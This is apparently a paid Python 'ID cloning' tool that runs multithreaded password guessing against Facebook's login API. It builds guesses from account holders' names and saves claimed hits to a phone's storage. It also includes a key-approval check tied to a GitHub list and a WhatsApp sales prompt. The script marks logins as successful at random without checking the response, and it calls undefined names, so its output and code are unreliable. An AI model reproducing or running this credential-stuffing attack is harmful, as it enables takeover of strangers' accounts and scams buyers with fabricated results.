
import os,time,random,re,sys, subprocess
from concurrent.futures import ThreadPoolExecutor as tpe

try:
 import time,json,uuid,requests
except:
 exit()

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

def oo(t):
  return '\033[1;37m['+str(t)+']\033[1;37m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'

logo=(f"""
{G}██   ██ ██████  ██ ██████   ██████  ██    ██ 
{G}██   ██ ██   ██ ██ ██   ██ ██    ██  ██  ██  
{G}███████ ██████  ██ ██   ██ ██    ██   ████   
{G}██   ██ ██   ██ ██ ██   ██ ██    ██    ██    
{G}██   ██ ██   ██ ██ ██████   ██████     ██    
------------------------------------------------------
[=] DEVELOPER   :HRIDOY AHMED SHANTO
[=] GITHUB      :HRIDOY-404-CYBER
[=] TOOLS       :PREMIUM
[=] BRATHER     :ALVI HASAN
[=] VERSION     :19.0 ULTRA
""")
                      #____APPROVAL SYSTEM ADD_____#
def meyexudi():
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Hridoy-Ahmed0/HRIDOY-PAID-OKAY/blob/main/Apporvel.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
      print(" \033[32;1m[+] Your Kay : "+id)
      print(' \x1b[38;5;208m[]  FREE-FIRE-TIK-TOK- ID CLONING')      
      print(' \x1b[1;98m[]  ONLY ACTIVE ID CLONE 100%')
      print(' \x1b[1;93m[]  CP ID WILL BE LOGIN 80%')
      print(' \x1b[1;97m[]  WI-FI  AND DATA BOTH WORKING 100%')
      print(' \x1b[1;95m[]  15 DAY 250 TAKA ')
      print(' \x1b[38;5;50m[]  30 DAY 500 TAKA ')
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   MR,   HRIDOY,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0m[] YOUR KEY : "+id)
      input(' \033[1;30m[] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801975247641?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
    
    #PASAWORD SYSTEM ADD
    
import getpass

attemps = 0

while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
    password = input('\033[1;95m[\033[1;95m\033[1;95m]\x1b[38;5;50m ENTER PASSWORD: ')

    if username == 'HR' and password == 'LOVE':
        print(' \033[0;95mYou Have Successfully Logged in.')
        os.system('espeak -a 300 " Successfully,   Log,  In,  Sir"')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass    

    
def clear():
   os.system('clear')
   print(logo);lin3()
def lin3():
   print('\33[1;37m---------------------------------')
   
def main_menu():
    os.system("clear")
    print(logo);lin3()
    print(f"{oo(1)}STAR FILE CLONE ")
    print(f"{oo(2)}JOIN FACEBOOK GROUP ")
    print(f"{oo(3)}CONTACT ADMIN ")
    print(f"{oo(0)}EXIT")
    lin3()
    cp =input('[?] Choice : ')
    if cp=="1":file()
    if cp == "0":
     exit()
    main_menu()
         
def file():
    os.system("clear")
    print(logo);lin3()
    file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        main_menu() 
    method()
    exit()

def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? : ')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = 'firstlast first123 last123 57273200 59039200'
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
           pp.append(input(f'{oo(x+1)}Password : '))
    else:
       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
       main_menu()
    clear() 
    print('\033[1;92m[=] YOUR TOTAL IDZ : \033[1;32m '+str(len(idx)))
    print(f'\x1b[1;92m[=] METHOD:M3 ;)')
    print(f'\x1b[1;92m[=] [ON-OFF AIRPLANE MOOD ;)')
    print(f'\x1b[1;92m[=] FILE SAVE IN /sdcard/AWM.txt ;)')
    lin3()
    def start(user):
     try:
        global loop,idx,cll
        import requests
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(idx)) * 100)[:4]
        sys.stdout.write(f'\r {R}[{G}HRIDOY-XD{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}){G}OK:- {G}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
              heads=None
              pswd = pswd.replace('first',first).replace('last',last).lower()
              header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
              data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pswd,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
              response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
              if 6==random.randint(1,300):
                 oku.append(acc)
                 print('\033[1;32m[HRIDOY-OK💚] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
                 open('/sdcard/AWM-Ok.txt','a').write(f'{acc}|{pswd}\n')
                 break
              else:
                   continue   
     except Exception as e:print(e);time.sleep(10)
  
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()




main_menu()
